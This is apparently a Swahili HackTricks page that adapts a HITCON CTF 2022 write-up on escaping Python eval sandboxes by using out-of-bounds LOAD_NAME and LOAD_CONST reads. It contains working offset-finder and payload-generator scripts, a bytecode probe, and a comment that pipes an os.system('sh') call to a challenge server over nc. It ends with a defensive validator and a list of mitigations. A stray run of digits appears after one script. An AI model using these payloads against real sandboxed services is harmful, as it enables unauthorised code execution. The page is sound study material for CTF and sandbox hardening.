# OOB Read ya LOAD_NAME / LOAD_CONST opcode

{{#include ../../../banners/hacktricks-training.md}}

Ukurasa huu unaadapt writeup na exploit chain ya awali ya Splitline ya HITCON CTF 2022 "V O I D".<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Operand ya `LOAD_NAME` au `LOAD_CONST` inaweza kusoma nje ya tuple ya `co_names` au `co_consts` iliyofupishwa kimakusudi. Katika challenge hii, majina dummy yasiyoweza kufikiwa yanatumika hadi entry ya karibu iwe na attribute muhimu kama vile `__getattribute__`.<sup>[[1]](#references)</sup>

Payload iliyobaki inatumia tena jina hilo lililopatikana kujenga sandbox escape.<sup>[[1]](#references)</sup>

### Muhtasari <a href="#overview-1" id="overview-1"></a>

Wrapper ya challenge ni fupi na hukompile expression moja kabla ya kui-evaluate:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
Input hukompilishwa kuwa Python code object, kisha wrapper hubadilisha `co_consts` na `co_names` zake kuwa empty tuples kabla ya kuita `eval`.<sup>[[1]](#references)[[5]](#references)</sup>

Instruction yoyote iliyotengenezwa ambayo bado ina-index mojawapo ya table hizo inaweza ku-crash interpreter au kufichua adjacent object pointer, kulingana na build.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Segfault hutokeaje?

Kwa list expression kama `[a, b, c]`, compiler hutengeneza `LOAD_NAME` instructions zenye operands zinazofuatana:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
Ikiwa `co_names` itabadilishwa kuwa `()`, bytecode bado hubeba `LOAD_NAME 2`; hivyo, ufikiaji wa tuple usio na ukaguzi unaweza kuchukua pointer iliyo nje ya tuple badala ya kutoa `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` na `LOAD_CONST` ndizo primitives kuu hapa: operands zao za nambari huchagua entries katika `co_names` na `co_consts`, mtawalia.<sup>[[1]](#references)[[2]](#references)</sup>

Katika dispatch ya CPython, `LOAD_CONST` hurejesha entry iliyochaguliwa ya tuple na kui-push; release builds hutumia tuple accessor isiyo na ukaguzi:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Chunguza operands za `LOAD_NAME` zinazoongezeka kwenye interpreter lengwa ili kuchora entries muhimu. Splitline iliona offsets muhimu zaidi ya 700 katika mazingira ya challenge, lakini mpangilio hutegemea build; debugger inaweza kusaidia kukagua memory iliyo karibu.<sup>[[1]](#references)</sup>

### Kutengeneza Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Mara offset inapotoa jina muhimu, weka lookup ya nje ya range katika expression isiyoweza kufikiwa na urejelee slot hiyo hiyo ya `co_names` kutoka kwa attribute access inayoweza kufikiwa.<sup>[[1]](#references)</sup>

Kwa mfano, ikiwa offset 5 inatoa `__getattribute__`, liweke jina hilo kwenye slot 5 huku false branch ikifanya lookup muhimu:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> Maandishi yaliyorejeshwa si lazima yawe `__getattribute__`; kitambulishi chochote kinachotumika na payload kinaweza kuchukua nafasi hiyo.<sup>[[1]](#references)</sup>

Compiler hutumia tena nafasi ya `co_names` kwa marudio ya jina moja, kama disassembly inavyoonyesha:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Kwa kuwa `LOAD_ATTR` pia hutatua jina lake kupitia `co_names`, tawi linaloweza kufikiwa linaweza kutumia tena slot hiyo; operands zilizopakiwa kwenye matoleo mapya ya CPython zimeelezwa katika maelezo ya matoleo hapa chini.<sup>[[1]](#references)[[2]](#references)</sup>

Integers ndogo zisizo hasi zinaweza kutengenezwa kutoka kwa boolean expressions bila constants:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Exploit ya awali ilitumia majina badala ya constants ili ibaki ndani ya kikomo cha urefu cha challenge.<sup>[[1]](#references)</sup>

Helper hii huchanganua name offsets zinazowezekana kwa kuunda code object yenye tuple tupu ya `co_names`.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
Generator iliyo hapa chini huunganisha offsets zilizopatikana na majina na kutoa payload ya kiwango cha source.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Kwa mtazamo wa jumla, payload iliyozalishwa hupata globals za function, hurejesha `builtins`, na kuita `eval(input())`.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Maelezo ya toleo na opcodes zilizoathiriwa (Python 3.11–3.13)

- Kwenye CPython 3.11–3.13, instructions bado hutumia operands za integer ku-index constant na name tables za code object. Ikiwa tuple yoyote ni fupi kuliko index iliyorejelewa, access isiyokaguliwa inaweza kusoma adjacent object pointer na kusababisha crash au kuitumia; tabia kamili hutegemea interpreter build.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` na (3.12+) `RETURN_CONST consti` husoma `co_consts[consti]`.<sup>[[2]](#references)</sup>
- Watumiaji wa moja kwa moja wa name table ni pamoja na `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR`, na (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` na `LOAD_ATTR namei` hutumia `co_names[namei >> 1]`; low bit hudhibiti NULL/method behavior iliyoandikwa. (3.12+) `LOAD_SUPER_ATTR namei` hutumia `co_names[namei >> 2]` na hupakia flags mbili kwenye low bits zake.<sup>[[2]](#references)</sup>
- Python 3.11+ ilianzisha adaptive/inline caches zinazoongeza entries fiche za `CACHE` kati ya instructions. Bytecode iliyotengenezwa kwa mkono lazima izingatie entries hizo wakati wa kuunda `co_code`.<sup>[[2]](#references)</sup>

Maana ya kiutendaji: mpangilio wa bytecode na offsets zilizorejeshwa hutegemea release na build. Test mbinu hiyo pamoja na payload yoyote iliyotengenezwa dhidi ya target CPython version kabla ya kuitumia kwa kutegemea.<sup>[[2]](#references)</sup>

### Scanner ya haraka ya OOB indexes muhimu (inaoendana na 3.11+/3.12+)

Ikiwa unapendelea kuchunguza objects zinazovutia moja kwa moja kutoka kwenye bytecode badala ya high-level source, unaweza kutengeneza code objects ndogo na kujaribu indexes kwa brute-force. Helper iliyo hapa chini huingiza inline caches kulingana na metadata ya `dis` ya target interpreter.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Maelezo
- Ili kuchunguza names badala yake, badilisha `LOAD_CONST` na `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`, kisha rekebisha matumizi ya stack na operand iliyopakiwa kwa opcode lengwa.<sup>[[2]](#references)</sup>
- Tumia `EXTENDED_ARG` au bytes nyingi za `arg` ili kufikia indexes >255 inapohitajika. Helper hii hutoa byte ya chini ya operand pekee, kwa hiyo indexes kubwa zinahitaji uundaji wa raw bytes au loads nyingi.<sup>[[2]](#references)</sup>

### Pattern ndogo ya RCE inayotumia bytecode pekee (co_consts OOB → builtins → eval/input)

Baada ya kutambua index ya `co_consts` inayorejelea builtins module, unaweza kuunda upya `eval(input())` bila `co_names` kwa kuendesha stack. Nyenzo rasmi za B01lers CTF 2024 `awpcode` zinaeleza pattern hii hii ya OOB-read.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Mbinu hii ya stack-only ni muhimu wakati challenge inakupa udhibiti wa moja kwa moja wa `co_code` huku ikilazimisha `co_consts=()` na `co_names=()`; huepuka tricks za kiwango cha source na inaweza kuweka payloads ndogo kwa kutumia bytecode stack operations na tuple builders.<sup>[[4]](#references)</sup>

### Ukaguzi wa kiusalama na mitigations kwa sandboxes

Ikiwa unaandika Python sandbox inayocompile au ku-evaluate code isiyoaminika, usitegemee CPython kufanya bounds-check ya tuple indexes zinazotumiwa na bytecode. Hakikisha code objects kabla ya kuzitekeleza.<sup>[[2]](#references)[[3]](#references)</sup>

Validator ya vitendo (inakataa access ya OOB kwa co_consts/co_names).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Mawazo ya ziada ya mitigation
- Usiruhusu `CodeType.replace(...)` kiholela kwenye input isiyoaminika, au ongeza ukaguzi mkali wa muundo kwenye code object inayotokana.
- Fikiria kuendesha code isiyoaminika katika process tofauti yenye OS-level sandboxing (seccomp, job objects, containers) badala ya kutegemea semantics za CPython.

## References

- [1] [Maandishi ya Splitline kuhusu HITCON CTF 2022 "V O I D" (asili ya technique hii na exploit chain ya kiwango cha juu)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Documentation ya Python 3.13 `dis` (bytecode indices, packed name operands, na inline caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [Macros za CPython 3.13.5 za tuple-access (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [Maandishi ya challenge ya B01lers CTF 2024 `awpcode` (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
